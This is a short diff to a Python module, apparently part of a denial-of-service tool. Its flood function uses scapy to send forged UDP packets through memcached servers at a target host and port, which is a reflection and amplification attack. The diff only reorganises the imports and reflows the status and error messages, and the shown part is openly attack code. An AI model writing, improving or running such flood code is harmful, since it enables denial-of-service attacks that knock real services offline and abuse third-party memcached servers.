@@ -1,5 +1,7 @@
+# GETADDRINFO needs fixing
 import random
-from scapy.all import IP, UDP, send, Raw
+from scapy.all import send, Raw
+from scapy.layers.inet import IP, UDP
 from colorama import Fore
 
 
@@ -25,12 +27,9 @@ def flood(target):
         send(packet, count=packets, verbose=False)
     except Exception as e:
         print(
-            f"{Fore.MAGENTA}Error while \
-                sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
+            f"{Fore.MAGENTA}Error while sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
         )
     else:
         print(
-            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} \
-                forged UDP packets from memcached \
-                    server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
+            f"{Fore.GREEN}[+]{Fore.YELLOW}Sending {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
         )
